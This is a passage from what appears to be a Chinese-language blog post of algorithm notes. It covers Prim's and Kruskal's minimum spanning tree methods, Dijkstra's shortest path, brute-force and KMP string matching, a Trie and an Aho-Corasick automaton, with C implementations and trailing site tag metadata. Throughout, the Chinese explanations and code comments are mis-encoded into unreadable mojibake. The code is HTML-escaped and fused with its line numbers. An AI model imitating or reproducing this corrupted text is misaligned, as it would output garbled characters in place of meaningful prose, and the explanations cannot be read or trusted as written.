ä¸ªèŠ‚ç‚¹åˆ°å½“å‰ç”Ÿæˆæ ‘çš„æœ€å°è·ç¦»ï¼ˆæƒå€¼æœ€å°çš„é‚£æ¡è¾¹çš„å€¼ï¼‰ã€‚å°†ç”Ÿæˆæ ‘çœ‹ä½œä¸€ä¸ªæ•´ä½“çš„è¯ï¼Œdist æ•°ç»„ä¸­çš„æœ‰æ•ˆå€¼å°±æ˜¯ä¸ç”Ÿæˆæ ‘ç›¸è¿çš„æ‰€æœ‰è¾¹çš„æƒå€¼ã€‚ é€šè¿‡ dist æ•°ç»„ï¼Œæ‰¾åˆ°ä¸‹ä¸€ä¸ªç”Ÿæˆæ ‘èŠ‚ç‚¹ã€‚ç„¶åæ›´æ–°åŠ å…¥æ–°èŠ‚ç‚¹ä¹‹åï¼Œæ–°çš„ dist æ•°ç»„ã€‚æŒºæŠ½è±¡çš„ï¼Œä½†æ˜¯è¿˜å¥½ï¼Œè¿‡ç¨‹å¾ˆçŸ­ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_N 1000const int INF = 0x3f3f3f3f;typedef struct Graph &#123; int n; int visited[MAX_N], dist[MAX_N]; int mat[MAX_N][MAX_N];&#125;Graph;void init(Graph *g, int input_n) &#123; g-&gt;n = input_n; for (int i = 0; i &lt; g-&gt;n; i++) &#123; for (int j = 0; j &lt; g-&gt;n; j++) &#123; g-&gt;mat[i][j] = INF; &#125; &#125;&#125;void insert(Graph *g, int x, int y, int weight) &#123; g-&gt;mat[x][y] = weight; g-&gt;mat[y][x] = weight;&#125;int prim(Graph *g, int v) &#123; int total_weight = 0; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;visited[i] = 0; g-&gt;dist[i] = INF; &#125; g-&gt;dist[v] = 0; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; int min_dist = INF, min_vertex; // è´ªå¿ƒæœç´¢ä¸‹ä¸€ä¸ªç”Ÿæˆæ ‘èŠ‚ç‚¹ for (int j = 0; j &lt; g-&gt;n; ++j) &#123; if (!g-&gt;visited[j] &amp;&amp; g-&gt;dist[j] &lt; min_dist) &#123; min_dist = g-&gt;dist[j]; min_vertex = j; &#125; &#125; total_weight += min_dist; g-&gt;visited[min_vertex] = 1; // æ–°åŠ å…¥èŠ‚ç‚¹åï¼Œæ›´æ–°distæ•°ç»„ for (int j = 0; j &lt; g-&gt;n; ++j) &#123; if (!g-&gt;visited[j] &amp;&amp; g-&gt;mat[min_vertex][j] &lt; g-&gt;dist[j]) &#123; g-&gt;dist[j] = g-&gt;mat[min_vertex][j]; &#125; &#125; &#125; return total_weight;&#125;int main() &#123; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); Graph *g = (Graph *)malloc(sizeof(Graph)); init(g, n); for (int i = 0; i &lt; m; i++) &#123; int a, b, c; scanf(\"%d %d %d\", &amp;a, &amp;b ,&amp;c); insert(g, a, b, c); &#125; printf(\"%d\\n\", prim(g, 0)); free(g); return 0;&#125; å®ç°ä¸­å¾ˆå®¹æ˜“å‘ç°ï¼Œå­˜åœ¨å¾ˆå¤šä¸å¿…è¦çš„éå†ï¼Œæ¯æ¬¡éå†éƒ½æ˜¯ä» 0 åˆ° nï¼Œæ˜¾ç„¶å­˜åœ¨ä¼˜åŒ–çš„ç©ºé—´ï¼Œä»¥åé‡åˆ°å†è¯´ã€‚ Kruskal å®šä¹‰å¸¦æƒå›¾ G çš„è¾¹é›†åˆä¸º Eï¼Œæ¥ç€å†å®šä¹‰æœ€å°ç”Ÿæˆæ ‘çš„è¾¹é›†åˆä¸º Tï¼Œåˆå§‹é›†åˆ T éƒ½ä¸ºç©ºã€‚ é¦–å…ˆï¼ŒæŠŠå›¾ \\(G\\) çœ‹æˆä¸€ä¸ªæœ‰ \\(n\\) æ£µæ ‘çš„æ£®æ—ï¼Œå›¾ä¸Šæ¯ä¸ªé¡¶ç‚¹å¯¹åº”ä¸€æ£µæ ‘ã€‚ æ¥ç€ï¼Œå°†è¾¹é›†åˆ \\(E\\) çš„æ¯æ¡è¾¹ï¼ŒæŒ‰æƒå€¼ä»å°åˆ°å¤§è¿›è¡Œæ’åºï¼Œ ä¾æ¬¡éå†æ¯æ¡è¾¹ \\(e = (u, v)\\)ï¼Œè®°é¡¶ç‚¹ \\(u\\) æ‰€åœ¨çš„æ ‘ä¸º \\(T_u\\)ï¼Œé¡¶ç‚¹ \\(v\\) æ‰€åœ¨çš„æ ‘ä¸º \\(T_v\\)ï¼Œå¦‚æœ \\(T_u\\) å’Œ \\(T_v\\) ä¸æ˜¯åŒä¸€æ£µæ ‘ï¼Œåˆ™å°†è¾¹ \\(e\\) åŠ å…¥é›†åˆ \\(T\\)ï¼Œå¹¶å°†ä¸¤æ£µæ ‘ \\(T_u\\) å’Œ \\(T_v\\) è¿›è¡Œåˆå¹¶ã€‚ ç®—æ³•æ‰§è¡Œå®Œæ¯•åï¼Œé›†åˆ \\(T\\) è®°å½•äº†æœ€å°ç”Ÿæˆæ ‘çš„æ‰€æœ‰è¾¹ã€‚ è´ªå¿ƒç­–ç•¥ï¼Œæ¯æ¬¡éƒ½ä¼šé€‰æ‹©ä¸€æ¡ä¸¤ä¸ªé¡¶ç‚¹ä¸åœ¨åŒä¸€æ£µæ ‘ä¸”æƒå€¼æœ€å°çš„è¾¹åŠ å…¥é›†åˆã€‚ ç®—æ³•åŒ…æ‹¬æ‰€æœ‰è¾¹æƒå€¼æ’åºå’Œéå†æ‰€æœ‰è¾¹åˆå¹¶æ ‘ã€‚æ•´ä½“æ—¶é—´å¤æ‚åº¦ä¸»è¦çœ‹æ’åºéƒ¨åˆ† \\(O(E\\log(E))\\)ã€‚æ‰€ä»¥å¯¹äºç»“ç‚¹å¤šä½†æ˜¯è¾¹å°‘çš„ç¨€ç–å›¾ï¼Œæ€§èƒ½ä¼šæ¯”Primç®—æ³•å¥½ã€‚ å®ç°ä¸Šï¼Œæ’åºä½¿ç”¨å¿«é€Ÿæ’åºï¼Œåˆå¹¶éªŒè¯ä½¿ç”¨å¹¶æŸ¥é›†ï¼Œã€‚ æœ€çŸ­è·¯å¾„ æ±‚ä¸€ä¸ªèµ·ç‚¹åˆ°å…¶ä½™å„ä¸ªé¡¶ç‚¹çš„æœ€çŸ­è·¯å¾„é—®é¢˜ã€‚ Dijkstra å®šä¹‰å¸¦æƒå›¾ G æ‰€æœ‰é¡¶ç‚¹çš„é›†åˆä¸º Vï¼Œæ¥ç€å†å®šä¹‰å·²ç¡®å®šæœ€çŸ­è·¯å¾„çš„é¡¶ç‚¹é›†åˆä¸º Uï¼Œåˆå§‹é›†åˆ U ä¸ºç©ºã€‚ é¦–å…ˆå°†èµ·ç‚¹ \\(x\\) åŠ å…¥é›†åˆ \\(U\\)ï¼Œå¹¶åœ¨æ•°ç»„ \\(A\\) ä¸­è®°å½•èµ·ç‚¹ \\(x\\) åˆ°å„ä¸ªç‚¹çš„æœ€çŸ­è·¯å¾„ï¼ˆå¦‚æœé¡¶ç‚¹åˆ°èµ·ç‚¹ \\(x\\) æœ‰ç›´æ¥ç›¸è¿çš„è¾¹ï¼Œåˆ™æœ€çŸ­è·¯å¾„ä¸ºè¾¹æƒå€¼ï¼Œå¦åˆ™ä¸ºä¸€ä¸ªæå¤§å€¼ï¼‰ã€‚ ä»æ•°ç»„ \\(A\\) ä¸­é€‰æ‹©ä¸€ä¸ªè·ç¦»èµ·ç‚¹ \\(x\\) æœ€è¿‘çš„ï¼Œä¸”ä¸å±äºé›†åˆ \\(U\\) çš„é¡¶ç‚¹ \\(v\\)ï¼ˆå¦‚æœæœ‰å¤šä¸ªé¡¶ç‚¹ \\(v\\)ï¼Œä»»é€‰å…¶ä¸€å³å¯ï¼‰ï¼Œå°†é¡¶ç‚¹ \\(v\\) åŠ å…¥é›†åˆ \\(U\\)ï¼Œå¹¶æ›´æ–°æ‰€æœ‰ä¸é¡¶ç‚¹ \\(v\\) ç›¸è¿çš„é¡¶ç‚¹åˆ°èµ·ç‚¹ \\(x\\) çš„æœ€çŸ­è·¯å¾„ã€‚ é‡å¤ç¬¬äºŒæ­¥æ“ä½œï¼Œç›´è‡³é›†åˆ \\(U\\) ç­‰äºé›†åˆ \\(V\\)ã€‚ ç®—æ³•ç»“æŸï¼Œæ•°ç»„ \\(A\\) è®°å½•äº†èµ·ç‚¹ \\(x\\) åˆ°å…¶ä½™ \\(n - 1\\) ä¸ªç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚ å’ŒPrimå¾ˆç±»ä¼¼ï¼Œå·®åˆ«åœ¨äºæ¯”è¾ƒå¤§å°çš„ç›®æ ‡æ˜¯è·ç¦»èµ·ç‚¹ x çš„è·ç¦»ã€‚åŒæ—¶ç®—æ³•ä¸èƒ½å¤„ç†æœ‰è´Ÿæƒè¾¹çš„é—®é¢˜ï¼ˆè¿™æ˜¯Bellman Fordè¿™ç±»ç®—æ³•è§£å†³çš„é—®é¢˜ï¼‰ã€‚ æ—¶é—´å¤æ‚åº¦å’ŒPrimç±»ä¼¼ï¼Œåœ¨æ˜¯ä½¿ç”¨ Fibonacci heap ä¼˜åŒ–åï¼Œä¸º\\(O(E + V\\log V)\\)ã€‚ ç®—æ³•çš„å…³é”®å°±æ˜¯æ›´æ–°å½“å‰æœ€ä¼˜ç»“ç‚¹çš„ç›¸é‚»ç»“ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚ï¼ˆçœŸçš„ä¸å–œæ¬¢è´ªå¿ƒè¿™ä¸ªè¯ï¼Œæ¯æ¬¡æ‰¾åˆ°æœ€å€¼æ€ä¹ˆå°±è´ªå¿ƒäº†ï¼Ÿè´ªå¿ƒæ˜¯å·²ç»å¾—åˆ°æœ€å¥½ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸æ»¡è¶³çš„ã€‚ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_N 1000const int INF = 0x3f3f3f3f;typedef struct Graph &#123; int n; int visited[MAX_N], dist[MAX_N]; int mat[MAX_N][MAX_N];&#125;Graph;void init(Graph *g, int input_n) &#123; g-&gt;n = input_n; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; for (int j = 0; j &lt; g-&gt;n; j++) &#123; g-&gt;mat[i][j] = INF; &#125; &#125;&#125;void insert(Graph *g, int x, int y, int weight) &#123; g-&gt;mat[x][y] = weight; g-&gt;mat[y][x] = weight;&#125;void dijkstra(Graph *g, int v) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;visited[i] = 0; g-&gt;dist[i] = INF; &#125; g-&gt;dist[v] = 0; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; int min_d = INF, min_i; // iç»“ç‚¹å½“å‰åˆ°èµ·ç‚¹çš„æœ€çŸ­è·¯å¾„ for (int j = 0; j &lt; g-&gt;n; ++j) &#123; if (!g-&gt;visited[j] &amp;&amp; g-&gt;dist[j] &lt; min_d) &#123; min_d = g-&gt;dist[j]; min_i = j; &#125; &#125; g-&gt;visited[min_i] = 1; // ä»å·²çŸ¥æœ€çŸ­è·¯å¾„çš„ç»“ç‚¹å¼€å§‹ï¼Œè®¡ç®—ç›¸é‚»ç»“ç‚¹åˆ°èµ·ç‚¹çš„æœ€çŸ­è·¯å¾„æ˜¯å¦éœ€è¦æ›´æ–° for (int k = 0; k &lt; g-&gt;n; k++) &#123; if (!g-&gt;visited[k] &amp;&amp; g-&gt;mat[min_i][k] + min_d &lt; g-&gt;dist[k]) &#123; g-&gt;dist[k] = g-&gt;mat[min_i][k] + min_d; &#125; &#125; &#125;&#125;int main() &#123; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); Graph *g = (Graph *)malloc(sizeof(Graph)); init(g, n); for (int i = 0; i &lt; m; i++) &#123; int a, b, c; scanf(\"%d %d %d\", &amp;a, &amp;b ,&amp;c); insert(g, a, b, c); &#125; int v; scanf(\"%d\", &amp;v); dijkstra(g, v); for (int i = 0; i &lt; n; i++) &#123; printf(\"%d: %d\\n\", i, g-&gt;dist[i]); &#125; free(g); return 0;&#125; å­—ç¬¦ä¸²åŒ¹é… è¿™éƒ¨åˆ†ä¹‹å‰æ•´ç†è¿‡ï¼Œå­—ç¬¦ä¸²åŒ¹é…ä»KMPåˆ°ACè‡ªåŠ¨æœºã€‚ä½†æ˜¯è¿™ä¸ªä¸œè¥¿å°±æ˜¯å®¹æ˜“å¿˜ã€‚ åŸºç¡€çš„æš´åŠ›æœç´¢æ–¹æ³•å°±ä¸è°ˆäº†ï¼Œæ²¡å•¥å¯è®°çš„ã€‚ 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLEN 1024int match(char *buffer, char *pattern) &#123; for (int i = 0; i &lt; strlen(buffer) - strlen(pattern) + 1; ++i) &#123; int j = 0; for (; j &lt; strlen(pattern); ++j) &#123; if (buffer[i + j] != pattern[j]) &#123; break; &#125; &#125; if (j == strlen(pattern)) &#123; return i; &#125; &#125; return -1;&#125;int main() &#123; char buffer[MAXLEN], pattern[MAXLEN]; scanf(\"%s%s\", buffer, pattern); int location = match(buffer, pattern); if (location != -1) &#123; printf(\"match success, location is %d\\n\", location); &#125; else &#123; printf(\"match failed!\\n\"); &#125; return 0;&#125; æ³¨æ„ i &lt; strlen(buffer) - strlen(pattern) + 1ï¼Œå…¶ä¸­ + 1 æ‰è¡¨ç¤ºæœ€åä¸€æ®µ pattern é•¿åº¦çš„å­—ç¬¦çš„èµ·ç‚¹indexã€‚ KMP 12S: aaaaaababaaaaaW: ababc ä¸Šä¾‹ï¼ŒababåŒ¹é…ï¼Œcä¸åŒ¹é…ã€‚æš´åŠ›æœç´¢ä¼šç›´æ¥é€€å›4ä¸ªä½ç½®ï¼Œä»Sä¸­açš„ä¸‹ä¸€ä¸ªbå¼€å§‹é‡æ–°åŒ¹é…Wã€‚ KMPçš„æ€æƒ³å°±æ˜¯ï¼Œä¸å›é€€4ï¼Œè€Œæ˜¯åˆ©ç”¨å·²ç»åŒ¹é…è¿‡çš„å­—ç¬¦ï¼Œæ‰¾åˆ°å¯ä»¥ç›´æ¥è·³è¿‡ï¼Œå¹¶ä¸”ä¸€å®šå’ŒWçš„ä¸€éƒ¨åˆ†åŒ¹é…çš„ä½ç½®ã€‚æ¯”å¦‚ä¸Šä¾‹ä¸­ï¼Œç¬¬ä¸€æ¬¡ababåŒ¹é…ï¼Œcä¸åŒ¹é…ï¼Œé‚£ä¹ˆæ­¤æ—¶ï¼Œæ ¹æ®Wçš„è§„å¾‹ï¼ŒSä¸­å¿…ç„¶å‡ºç°äº†ababã€‚æ­¤æ—¶å¯ä»¥è·³è¿‡Sä¸­aä¹‹åçš„ç¬¬ä¸€ä¸ªbï¼Œä»ç¬¬äºŒä¸ªabä¹‹åçš„ä½ç½®å¼€å§‹åŒ¹é…Wçš„ç¬¬ä¸€ä¸ªabä¹‹åçš„éƒ¨åˆ†ã€‚ KMPå°±æ˜¯åˆ†æWçš„è§„å¾‹ï¼Œæ‰¾åˆ°å½“æ¯ä¸€ä¸ªä½ç½®å­—ç¬¦å‡ºç°ä¸åŒ¹é…æ—¶ï¼Œä¸‹ä¸€æ¬¡åŒ¹é…å¯ä»¥é«˜æ•ˆè·³è¿‡çš„éƒ¨åˆ†ã€‚ å»ºç«‹ä¸€ä¸ª Next æ•°ç»„ï¼Œè®°å½•åœ¨ W ä¸­ï¼Œæ‹¥æœ‰ç›¸åŒå‰ç¼€çš„å­ä¸²ä¸­æœ€åä¸€ä¸ªå­—ç¬¦çš„indexå€¼ã€‚å°±æ˜¯ä¸‹ä¸€æ¬¡åŒ¹é…å¼€å§‹çš„ä½ç½®ã€‚æ³¨æ„å…¶ä¸­ä¸€ä¸ªå­ä¸²æ˜¯ä» W çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹çš„ï¼Œå¦ä¸€ä¸ªå­—ä¸²ä½äº W ä¸­é—´éƒ¨åˆ†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAX_LEN 100010void get_next(char *pat, int *next) &#123; next[0] = 0; for (int i = 1, j = 0; i &lt; strlen(pat); ++i) &#123; // j - 1 ä»£è¡¨å·²ç»æˆåŠŸåŒ¹é…çš„æœ€åä¸€ä¸ªä½ç½®çš„indexï¼Œjä¸ºå¾…åŒ¹é…çš„ç¬¬ä¸€ä¸ªä½ç½® while (j &amp;&amp; pat[j] != pat[i]) &#123; j = next[j - 1]; &#125; if (pat[j] == pat[i]) &#123; j++; &#125; next[i] = j; &#125;&#125;int find(char *buffer, char *pat, int *next) &#123; // j ä»£è¡¨j - 1 åŠä¹‹å‰çš„éƒ¨åˆ†å·²ç»åŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸä¼šç­‰äº pat çš„é•¿åº¦ for (int i = 0, j = 0; i &lt; strlen(buffer); ++i) &#123; while (j &amp;&amp; pat[j] != buffer[i]) &#123; j = next[j - 1]; &#125; if (pat[j] == buffer[i]) &#123; j++; &#125; if (j == strlen(pat)) &#123; return i - j + 1; &#125; &#125; return -1;&#125;int main() &#123; char buffer[MAX_LEN], pattern[MAX_LEN]; int next[MAX_LEN]; scanf(\"%s%s\", buffer, pattern); get_next(pattern, next); int location = find(buffer, pattern, next); if (location == -1) &#123; printf(\"No\\n\"); &#125; else &#123; printf(\"Yes\\n%d\\n\", location); &#125; return 0;&#125; Trie å¤šä¸ªæ¨¡å¼å­—ç¬¦ä¸²å‰ç¼€æ ‘ï¼Œå¤„ç†ä¸€ä¸ªè¾“å…¥ä¸²ä»å¤šä¸ªæ¨¡å¼å­—ç¬¦ä¸²ä¸­è¿›è¡ŒåŒ¹é…å‰ç¼€çš„æƒ…å†µã€‚ Trie æ ‘æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š Trie æ ‘çš„æ ¹ç»“ç‚¹ä¸Šä¸å­˜å‚¨å­—ç¬¦ï¼Œå…¶ä½™ç»“ç‚¹ä¸Šå­˜ä¸”åªå­˜ä¸€ä¸ªå­—ç¬¦ã€‚ ä»æ ¹ç»“ç‚¹å‡ºå‘ï¼Œåˆ°æŸä¸€ç»“ç‚¹ä¸Šç»è¿‡çš„å­—ç¬¦ï¼Œå³æ˜¯è¯¥ç»“ç‚¹å¯¹åº”çš„å‰ç¼€ã€‚ æ¯ä¸ªç»“ç‚¹çš„å­©å­ç»“ç‚¹å­˜å‚¨çš„å­—ç¬¦å„ä¸ç›¸åŒã€‚ Trie æ ‘ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ—¶é—´ï¼Œå½“æ•°æ®é‡å¾ˆå¤§æ—¶ï¼Œä¼šå ç”¨å¾ˆå¤§ç©ºé—´ã€‚å¦‚æœå­—ç¬¦ä¸²å‡ç”±å°å†™å­—æ¯ç»„æˆï¼Œåˆ™æ¯ä¸ªç»“ç‚¹æœ€å¤šä¼šæœ‰ \\(26\\) ä¸ªå­©å­ç»“ç‚¹ï¼Œåˆ™æœ€å¤šä¼šæœ‰ \\(26^n\\) ä¸ªç”¨äºå­˜å‚¨çš„ç»“ç‚¹ï¼Œ\\(n\\) ä¸ºå­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ Trie æ ‘å¸¸ç”¨äºå­—ç¬¦ä¸²çš„å¿«é€Ÿæ£€ç´¢ï¼Œå­—ç¬¦ä¸²çš„å¿«é€Ÿæ’åºä¸å»é‡ï¼Œæ–‡æœ¬çš„è¯é¢‘ç»Ÿè®¡ç­‰ã€‚æŸ¥è¯¢æ•ˆç‡å¯¹äºé•¿åº¦ä¸º n çš„è¾“å…¥ä¸²ï¼Œæ—¶é—´å¤æ‚ä¸º O(n)ã€‚ ä¸‹é¢ç¨‹åºåˆ©ç”¨Trieè®¡ç®—ä¸€æ®µè¾“å…¥ä¸² S ä¸­ä¸é‡å¤çš„å­—ä¸²ä¸ªæ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;const int N = 100010;const int SIZE = 26;const char BASE = 'a';typedef struct TrieNode &#123; int is_terminal; struct TrieNode **childs; // 26ä¸ªå­—æ¯&#125; TrieNode, *Trie;TrieNode* new_node() &#123; Trie p = (Trie)malloc(sizeof(TrieNode)); p-&gt;childs = (Trie *)malloc(sizeof(Trie) *SIZE); for (int i = 0; i &lt; SIZE; i++) &#123; p-&gt;childs[i] = NULL; &#125; p-&gt;is_terminal = 0; return p;&#125;void clear(Trie t) &#123; if (t) &#123; for (int i = 0; i &lt; SIZE; ++i) &#123; if (t-&gt;childs[i]) &#123; clear(t-&gt;childs[i]); &#125; &#125; free(t-&gt;childs); free(t); &#125;&#125;// å¢è‚Œä¸€ä¸ªå‚æ•° resï¼Œç´¯è®¡ä¸€æ®µå­—ç¬¦ä¸²ä¸­ä¸åŒå­—ä¸²çš„ä¸ªæ•°ã€‚void insert(Trie trie, char *pattern, int *res) &#123; TrieNode *p = trie; for (int i = 0; i &lt; strlen(pattern); ++i) &#123; if (p-&gt;childs[pattern[i] - BASE] == NULL) &#123; p-&gt;childs[pattern[i] - BASE] = new_node(); (*res)++; &#125; p = p-&gt;childs[pattern[i] - BASE]; &#125; p-&gt;is_terminal = 1;&#125;int find(Trie trie, char *buffer) &#123; TrieNode *p = trie; for (int i = 0; i &lt; strlen(buffer); i++) &#123; if (p-&gt;childs[buffer[i] - BASE] == NULL) &#123; return 0; &#125; p = p-&gt;childs[buffer[i] - BASE]; &#125; return p-&gt;is_terminal;&#125;int main() &#123; char s[100005]; scanf(\"%s\", s); // è®¡ç®—ç´¯è®¡ä¸€æ®µå­—ç¬¦ä¸²ä¸­ä¸åŒå­—ä¸²çš„ä¸ªæ•°ã€‚ int res = 0; Trie root = new_node(); for (int i = 0; i &lt; strlen(s); ++i) &#123; insert(root, s + i, &amp;res); &#125; printf(\"%d\", res); clear(root); return 0;&#125; ACè‡ªåŠ¨æœº å¤„ç†å¤šä¸ªæ¨¡å¼ä¸²ï¼Œåœ¨ä¸€ä¸ªè¾“å…¥ä¸² S ä¸­æœç´¢å‡ºç°çš„æ¨¡å¼ä¸²çš„é—®é¢˜ã€‚ ACè‡ªåŠ¨æœºçº¦ç­‰äºTrie + KMPï¼ŒåŠ é€Ÿå¤špatternåŒ¹é…è¿‡ç¨‹ã€‚ æ„å»º patterns çš„ Trie æ„å»º fail æŒ‡é’ˆ å¼€å§‹åŒ¹é… æ„å»º fail æŒ‡é’ˆ åœ¨Trieä¸­ï¼ŒBFSéå†ï¼Œç¬¬ä¸€å±‚ï¼ŒfailæŒ‡é’ˆéƒ½æŒ‡å‘ root ç¬¬ä¸€å±‚ä¹‹åï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„ fail æŒ‡é’ˆï¼ŒæŒ‡å‘ ã€è¯¥èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ã€‘ çš„ ã€failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ã€‘ çš„ ã€å„¿å­èŠ‚ç‚¹ã€‘ä¸­ ã€å’Œè¯¥èŠ‚ç‚¹ï¼ˆè‡ªå·±ï¼‰åŒå­—ç¬¦çš„èŠ‚ç‚¹ã€‘ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œã€failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ã€‘ç»§ç»­å‘ä¸Šæ‰¾ fail èŠ‚ç‚¹ï¼Œç›´åˆ° rootã€‚ failæŒ‡é’ˆè¡¨ç¤ºçš„æ˜¯ä»¥å½“å‰å­—ç¬¦ä½œä¸ºå¼€å¤´çš„æœ€é•¿åç¼€æ‰€åœ¨çš„ä½ç½®ã€‚ åŒ¹é…è¿‡ç¨‹ è¾“å…¥string sï¼Œtrieä» rootå¼€å§‹ï¼Œè¿›è¡ŒåŒ¹é… å½“åŒ¹é…å¤±è´¥ï¼Œè·³è½¬åˆ°failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ï¼Œå¦‚æœfailåˆ° rootï¼Œè¾“å…¥æ­¤ä½ç½®ä¹‹åçš„string sçš„éƒ¨åˆ†ï¼Œç»§ç»­æŸ¥æ‰¾ã€‚ å½“åŒ¹é…æˆåŠŸï¼ˆTrieæ ‡è®°çš„èŠ‚ç‚¹ï¼‰ï¼Œä¹Ÿè·³è½¬åˆ°failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ï¼Œå¦‚æœæ­¤æ—¶è·³è½¬åˆ° rootï¼Œè¿›è¡Œå›æº¯åˆ°å‰ä¸€ä¸ªæœ€é•¿çš„trieè·¯å¾„èŠ‚ç‚¹ã€‚ ä¸‹é¢çš„ç¨‹åºï¼Œè¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¾“å‡ºè¾“å…¥ä¸²ä¸­å‡ºç°å¤šå°‘ä¸ªå·²çŸ¥patternã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;const int SIZE = 26;const char BASE = 'a';const int MAX_SIZE = 20005;const int MAX_LEN = 25;typedef struct TrieNode &#123; int count; struct TrieNode** childs; struct TrieNode* fail;&#125; TrieNode, *Trie;TrieNode* new_node() &#123; TrieNode *p = (TrieNode *)malloc(sizeof(TrieNode)); p-&gt;childs = (TrieNode **)malloc(sizeof(TrieNode *) * SIZE); for (int i = 0; i &lt; SIZE; i++) &#123; p-&gt;childs[i] = NULL; &#125; p-&gt;fail = NULL; p-&gt;count = 0; return p;&#125;void clear(TrieNode *p) &#123; if (p != NULL) &#123; for (int i = 0; i &lt; SIZE; i++) &#123; if (p-&gt;childs[i] != NULL) &#123; clear(p-&gt;childs[i]); &#125; &#125; free(p-&gt;childs); free(p); &#125;&#125;// æ„å»ºTrieï¼Œå¹¶è®°å½•æ¯ä¸ªpatternå‡ºç°æ¬¡æ•°ï¼Œä¿å­˜åœ¨æ¯ä¸ªnodeçš„countå±æ€§ä¸­void insert(Trie trie, char *buffer) &#123; TrieNode *p = trie; for (int i = 0; i &lt; strlen(buffer); i++) &#123; if (p-&gt;childs[buffer[i] - BASE] == NULL) &#123; p-&gt;childs[buffer[i] - BASE] = new_node(); &#125; p = p-&gt;childs[buffer[i] - BASE]; &#125; p-&gt;count++;&#125;// æ„å»ºfailæŒ‡é’ˆvoid build_automaton(Trie root) &#123; root-&gt;fail = root; TrieNode *q[MAX_SIZE]; // è¿™é‡Œçš„BFSä½¿ç”¨æ•°ç»„æ¨¡æ‹Ÿqueue int l = 0, r = 0; q[r++] = root; // BFS while (l &lt; r) &#123; TrieNode *now = q[l++]; for (int i = 0; i &lt; SIZE; ++i) &#123; if (now-&gt;childs[i] != NULL) &#123; TrieNode *child = now-&gt;childs[i]; if (now == root) &#123; // rootæŒ‡å‘è‡ªå·± child-&gt;fail = root; &#125; else &#123; TrieNode *iter = now; // æ‰¾åˆ°failæŒ‡é’ˆä¸­ç›¸åŒå­—ç¬¦ while (iter != root &amp;&amp; iter-&gt;fail-&gt;childs[i] == NULL) &#123; iter = iter-&gt;fail; &#125; // æ£€æŸ¥æ˜¯å¦å¯ä»¥ä»failæŒ‡é’ˆçš„childå¼€å§‹å‘ä¸‹åŒ¹é… if (iter-&gt;fail-&gt;childs[i] != NULL) &#123; child-&gt;fail = iter-&gt;fail-&gt;childs[i]; &#125; else &#123; child-&gt;fail = root; &#125; &#125; // BFS æ¯ä¸€å±‚node q[r++] = child; &#125; &#125; &#125;&#125;int match_count(Trie root, const char *buffer) &#123; TrieNode *p = root; int total_count = 0; for (int i = 0; buffer[i]; ++i) &#123; // patternä¸åŒ¹é…ï¼Œå‘failæŒ‡é’ˆå›æº¯ while (p != root &amp;&amp; p-&gt;childs[buffer[i] - BASE] == NULL) &#123; p = p-&gt;fail; &#125; p = p-&gt;childs[buffer[i] - BASE]; if (p == NULL) &#123; p = root; &#125; // ç´¯åŠ åŒ¹é…æˆåŠŸçš„Trieæ ‘è·¯å¾„ä¸Šï¼Œæœ‰æ•ˆpatternçš„æ•°é‡ï¼Œå› ä¸ºå›æº¯åœæ­¢æ—¶ï¼Œåœåœ¨æœ€å¤§åŒ¹é…å¤„ TrieNode *iter = p; while (iter != root) &#123; total_count += iter-&gt;count; iter = iter-&gt;fail; &#125; &#125; return total_count;&#125;int main() &#123; Trie root = new_node(); int n; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; ++i) &#123; char pattern[MAX_LEN]; scanf(\"%s\", pattern); insert(root, pattern); &#125; build_automaton(root); char str_buffer[100005]; scanf(\"%s\", str_buffer); printf(\"%d\\n\", match_count(root, str_buffer)); clear(root); return 0;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"}],"tags":[{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"cs 